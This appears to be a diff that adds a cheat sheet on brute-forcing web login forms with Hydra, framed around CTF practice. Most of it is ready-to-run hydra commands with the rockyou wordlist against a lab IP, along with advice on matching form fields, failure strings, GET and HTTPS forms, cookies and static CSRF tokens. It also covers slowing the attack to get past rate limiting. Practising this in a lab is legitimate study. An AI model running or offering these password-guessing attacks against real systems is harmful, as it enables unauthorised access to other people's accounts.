@@ -1,0 +1,142 @@
+If username isn’t admin:
+
+Use:
+
+hydra -L users.txt -P rockyou.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+else:
+
+hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:username=admin&password=^PASS^:Invalid login"
+
+You change parameters whenever the real HTTP request differs from what you wrote.
+
+Hydra must match the request exactly as the server expects.
+🔍 When You Must Change Parameters
+1️⃣ When Form Field Names Are Different
+
+Not every login uses:
+
+username=
+password=
+
+Sometimes it’s:
+
+user=
+pass=
+email=
+login=
+pwd=
+
+Example
+
+If request looks like:
+
+POST /auth.php
+user=admin&pwd=test123
+
+Then change to:
+
+hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/auth.php:user=admin&pwd=^PASS^:Invalid credentials"
+
+👉 Always inspect using:
+
+    Browser DevTools → Network tab
+
+    Burp Suite
+
+    curl -v
+
+2️⃣ When Failure Message Is Different
+
+Hydra detects failure by matching the failure string.
+
+If the page returns:
+
+Wrong password
+
+Then change:
+
+:Wrong password
+
+If it redirects on failure and doesn’t show error text, you may need:
+
+:F=Invalid
+
+OR use success condition instead:
+
+:S=Welcome
+
+Example:
+
+"/login.php:user=admin&pass=^PASS^:S=Dashboard"
+
+3️⃣ When Method Is GET Instead of POST
+
+If login request is:
+
+GET /login.php?user=admin&pass=test
+
+Then use:
+
+http-get-form
+
+Example:
+
+hydra -l admin -P rockyou.txt 10.10.10.5 http-get-form "/login.php:user=admin&pass=^PASS^:Invalid"
+
+4️⃣ When Login Page Is HTTPS
+
+Change target to:
+
+https-post-form
+
+Example:
+
+hydra -l admin -P rockyou.txt 10.10.10.5 https-post-form "/login.php:user=admin&pass=^PASS^:Invalid"
+
+OR specify port:
+
+-s 443
+
+5️⃣ When CSRF Token Is Present
+
+If request contains:
+
+csrf_token=4f8a9c1e
+
+Hydra alone will fail because token changes every request.
+
+Then you need:
+
+    Burp Intruder
+
+    Or script-based brute force
+
+    Or bypass token logic
+
+👉 In CTF, sometimes token is static → then include it:
+
+"/login.php:user=admin&pass=^PASS^&token=STATICVALUE:Invalid"
+
+6️⃣ When Extra Headers Are Required
+
+Some apps require:
+
+Cookie: PHPSESSID=abc123
+
+Add with:
+
+-H "Cookie: PHPSESSID=abc123"
+
+Example:
+
+hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:user=admin&pass=^PASS^:Invalid" -H "Cookie: PHPSESSID=abc123"
+
+7️⃣ When Rate Limiting Occurs
+
+Reduce threads:
+
+-t 4
+
+Add delay:
+
+-w 5
